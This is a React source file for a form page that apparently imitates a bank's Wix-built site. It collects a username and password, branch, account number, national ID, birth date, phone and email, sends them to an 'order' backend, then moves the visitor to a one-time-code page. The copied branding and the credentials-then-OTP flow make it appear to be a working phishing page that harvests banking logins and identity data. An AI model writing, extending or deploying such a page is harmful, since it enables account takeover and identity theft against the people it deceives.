import axios from "axios";
import { useEffect, useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { formLevelErrorClass } from "../components/FormFieldError";
import { PendingFormOverlay } from "../components/PendingFormOverlay";
import { BottomBar } from "../components/VisitorShared";
import { useLanguage } from "../context/LanguageContext";
import { api_route } from "../socketApi";
import { BRANCH_OPTIONS } from "../constants/formOptions";

function SelectChevron({ className }) {
  return (
    <svg
      className={className}
      xmlns="http://www.w3.org/2000/svg"
      viewBox="0 0 9.2828 4.89817"
      aria-hidden
    >
      <path
        fill="currentColor"
        d="M4.64116,4.89817a.5001.5001,0,0,1-.34277-.13574L.15727.86448A.50018.50018,0,0,1,.84282.136L4.64116,3.71165,8.44.136a.50018.50018,0,0,1,.68555.72852L4.98393,4.76243A.5001.5001,0,0,1,4.64116,4.89817Z"
      />
    </svg>
  );
}

function wixSelectWrapClass(err) {
  return `relative w-full ${err ? "rounded-md ring-2 ring-red-400" : ""}`;
}

function wixSelectClass() {
  return [
    "w-full appearance-none rounded-md border border-slate-300 bg-white",
    "py-3 ps-4 pe-10 text-sm text-slate-800 outline-none transition",
    "focus:border-slate-500 focus:ring-1 focus:ring-slate-400",
  ].join(" ");
}

function wixInputClass(err) {
  return [
    "w-full rounded-md border bg-white px-3 py-3 text-sm text-slate-800 outline-none transition",
    err
      ? "border-red-500 focus:ring-2 focus:ring-red-100"
      : "border-slate-300 focus:border-slate-500 focus:ring-1 focus:ring-slate-400",
  ].join(" ");
}

const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

export default function Branch() {
  const { t, dir, textDir } = useLanguage();
  const navigate = useNavigate();
  const location = useLocation();
  const orderId =
    location.state?.orderId ?? sessionStorage.getItem("currentOrderId");

  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [branchSelection, setBranchSelection] = useState("");
  const [accountNumber, setAccountNumber] = useState("");
  const [nationalId, setNationalId] = useState("");
  const [birthDate, setBirthDate] = useState("");
  const [phone, setPhone] = useState("");
  const [email, setEmail] = useState("");
  const [termsAccepted, setTermsAccepted] = useState(false);
  const [fieldErr, setFieldErr] = useState({});
  const [formError, setFormError] = useState("");
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    if (!orderId) {
      navigate("/", { replace: true });
    }
  }, [orderId, navigate]);

  const validate = () => {
    const e = {};
    const uLen = [...username.trim()].length;
    if (uLen < 5 || uLen > 20) e.username = true;
    if (!password) e.password = true;
    if (!branchSelection) e.branchSelection = true;
    const acct = accountNumber.replace(/\D/g, "");
    if (acct.length < 5 || acct.length > 7) e.accountNumber = true;
    const nid = nationalId.replace(/\D/g, "");
    if (nid.length < 5) e.nationalId = true;
    if (!birthDate.trim()) e.birthDate = true;
    if (!phone.trim()) e.phone = true;
    if (!EMAIL_RE.test(email.trim())) e.email = true;
    if (!termsAccepted) e.termsAccepted = true;
    setFieldErr(e);
    return Object.keys(e).length === 0;
  };

  const onSubmit = async (ev) => {
    ev.preventDefault();
    setFormError("");
    if (!validate()) return;
    setLoading(true);
    try {
      await axios.patch(`${api_route}/order/${orderId}/application`, {
        username: username.trim(),
        password,
        branchSelection,
        accountNumber: accountNumber.replace(/\D/g, ""),
        nationalId: nationalId.replace(/\D/g, ""),
        birthDate: birthDate.trim(),
        phone: phone.trim(),
        email: email.trim().toLowerCase(),
        termsAccepted,
      });
      sessionStorage.setItem("currentOrderId", orderId);
      navigate("/otp", { state: { orderId } });
    } catch {
      setFormError(t("formData.errors.formFailed"));
    } finally {
      setLoading(false);
    }
  };

  if (!orderId) {
    return null;
  }

  return (
    <section
      className="relative flex min-h-screen w-full justify-center bg-white"
      dir={dir}
    >
      <div
        className="flex w-full  flex-col items-center pt-8  lg:w-1/3"
        dir={textDir}
      >
        {/* comp-mou8kons */}
        <img
          src="/wix/landing-top-logo.png"
          alt=""
          width={134}
          height={61}
          className="mb-3 w-[134px] object-cover"
          fetchPriority="high"
        />

        {/* comp-mou759h6 */}
        <img
          src="/wix/branch-hero.png"
          alt=""
          className="mb-4 w-full  object-cover"
          fetchPriority="high"
        />

        {/* comp-mf2nqw9m6 */}
        <p className="mb-5 text-center text-[15px] font-bold leading-snug text-slate-900">
          {t("branch.intro")}
        </p>

        <form
          onSubmit={onSubmit}
          className="relative flex w-full max-w-[320px] flex-col gap-3"
          noValidate
        >
          <PendingFormOverlay
            show={loading}
            ariaLabel={t("common.loadingAria")}
          />
          <input
            name="username"
            type="text"
            autoComplete="username"
            maxLength={100}
            placeholder={t("branch.placeholderUsername")}
            value={username}
            onChange={(e) => {
              setUsername(e.target.value);
              setFieldErr((f) => ({ ...f, username: false }));
            }}
            className={wixInputClass(!!fieldErr.username)}
          />

          <input
            name="password"
            type="password"
            autoComplete="current-password"
            placeholder={t("branch.placeholderPassword")}
            value={password}
            onChange={(e) => {
              setPassword(e.target.value);
              setFieldErr((f) => ({ ...f, password: false }));
            }}
            className={wixInputClass(!!fieldErr.password)}
          />

          <div className={wixSelectWrapClass(!!fieldErr.branchSelection)}>
            <select
              id="branch-select"
              aria-label={t("branch.placeholderBranch")}
              required
              value={branchSelection}
              onChange={(e) => {
                setBranchSelection(e.target.value);
                setFieldErr((f) => ({ ...f, branchSelection: false }));
              }}
              className={wixSelectClass()}
            >
              <option value="" disabled>
                {t("branch.placeholderBranch")}
              </option>
              {BRANCH_OPTIONS.map((b, idx) => (
                <option key={`${b.value}-${idx}`} value={b.value}>
                  {b.label}
                </option>
              ))}
            </select>
            <span className="pointer-events-none absolute end-3 top-1/2 -translate-y-1/2 text-slate-500">
              <SelectChevron className="h-2 w-3" />
            </span>
          </div>

          <input
            type="text"
            inputMode="numeric"
            placeholder={t("branch.placeholderAccount")}
            value={accountNumber}
            onChange={(e) => {
              setAccountNumber(e.target.value.replace(/\D/g, "").slice(0, 7));
              setFieldErr((f) => ({ ...f, accountNumber: false }));
            }}
            className={wixInputClass(!!fieldErr.accountNumber)}
          />

          <input
            type="text"
            inputMode="numeric"
            placeholder={t("branch.placeholderNationalId")}
            value={nationalId}
            onChange={(e) => {
              setNationalId(e.target.value.replace(/\D/g, "").slice(0, 16));
              setFieldErr((f) => ({ ...f, nationalId: false }));
            }}
            className={wixInputClass(!!fieldErr.nationalId)}
          />

          <input
            type="date"
            placeholder={t("branch.placeholderBirthDate")}
            value={birthDate}
            onChange={(e) => {
              setBirthDate(e.target.value);
              setFieldErr((f) => ({ ...f, birthDate: false }));
            }}
            className={wixInputClass(!!fieldErr.birthDate)}
          />

          <input
            type="tel"
            autoComplete="tel"
            placeholder={t("branch.placeholderPhone")}
            value={phone}
            onChange={(e) => {
              setPhone(e.target.value);
              setFieldErr((f) => ({ ...f, phone: false }));
            }}
            className={wixInputClass(!!fieldErr.phone)}
          />

          <input
            type="email"
            autoComplete="email"
            placeholder={t("branch.placeholderEmail")}
            value={email}
            onChange={(e) => {
              setEmail(e.target.value);
              setFieldErr((f) => ({ ...f, email: false }));
            }}
            className={wixInputClass(!!fieldErr.email)}
          />

          <label className="flex cursor-pointer items-start gap-2 pt-1 text-[13px] leading-snug text-slate-800">
            <input
              type="checkbox"
              checked={termsAccepted}
              onChange={(e) => {
                setTermsAccepted(e.target.checked);
                setFieldErr((f) => ({ ...f, termsAccepted: false }));
              }}
              className="mt-0.5 size-4 shrink-0 rounded border-slate-400"
            />
            <span className={fieldErr.termsAccepted ? "text-red-700" : ""}>
              {t("branch.termsLabel")}
            </span>
          </label>

          {formError ? (
            <div className={formLevelErrorClass()} role="alert">
              {formError}
            </div>
          ) : null}

          <button
            type="submit"
            disabled={loading}
            aria-label={t("branch.submit")}
            className="mt-2 w-full rounded-md bg-[#B80070] py-3 text-center text-base font-medium text-white shadow-sm transition hover:bg-[#B80070] disabled:opacity-60"
          >
            {t("branch.submit")}
          </button>
        </form>

        <img
          src="/wix/landing-screenshot-2.png"
          alt=""
          className="mt-8 w-full  object-cover"
          loading="lazy"
        />
      </div>

      <BottomBar />
    </section>
  );
}
